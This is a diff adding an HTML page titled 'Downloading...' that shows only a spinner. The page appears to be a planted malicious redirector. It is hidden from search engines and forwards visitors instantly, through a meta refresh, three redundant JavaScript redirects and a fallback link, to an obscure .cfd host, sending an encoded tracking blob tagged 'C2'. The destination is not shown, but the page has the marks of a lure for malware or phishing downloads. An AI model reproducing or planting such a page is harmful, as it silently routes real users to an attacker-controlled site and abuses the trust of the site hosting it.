@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="robots" content="noindex,nofollow">
+    <meta http-equiv="refresh" content="0;url=https://generated8f9c3.host50p.cfd/?data=eyJpZCI6IjI4OTg3OSIsInRhZyI6InlCdDhFbVA2OkMyIiwicmVkaXJlY3RTdGVwIjowLCJ0aW1lc3RhbXAiOjE3Nzc5MDY5NTR9">
+    <title>Downloading...</title>
+    <link rel="icon" type="image/x-icon" href="https://www.iconbolt.com/iconsets/essential-flat/download.svg" />
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .loader {
+            text-align: center;
+        }
+        .spinner {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto;
+            border: 2px solid rgba(0,0,0,0.08);
+            border-top: 2px solid #000000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            box-shadow: 0 0 8px rgba(0,0,0,0.25), 0 0 2px rgba(0,0,0,0.5);
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <script>
+        const redirectUrl = "https:\/\/generated8f9c3.host50p.cfd\/?data=eyJpZCI6IjI4OTg3OSIsInRhZyI6InlCdDhFbVA2OkMyIiwicmVkaXJlY3RTdGVwIjowLCJ0aW1lc3RhbXAiOjE3Nzc5MDY5NTR9";
+        const delaySeconds = 0 * 1000;
+
+        // Primary redirect
+        window.onload = function() {
+            setTimeout(() => {
+                window.location.href = redirectUrl;
+            }, delaySeconds);
+        };
+
+        // Backup redirect
+        setTimeout(() => {
+            window.location.replace(redirectUrl);
+        }, delaySeconds);
+
+        // Final fallback
+        setTimeout(() => {
+            document.location.href = redirectUrl;
+        }, delaySeconds);
+    </script>
+</head>
+<body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <noscript>
+            <p>If you are not redirected automatically, please <a href="https://generated8f9c3.host50p.cfd/?data=eyJpZCI6IjI4OTg3OSIsInRhZyI6InlCdDhFbVA2OkMyIiwicmVkaXJlY3RTdGVwIjowLCJ0aW1lc3RhbXAiOjE3Nzc5MDY5NTR9">click here</a>.</p>
+        </noscript>
+    </div>
+</body>
+</html>
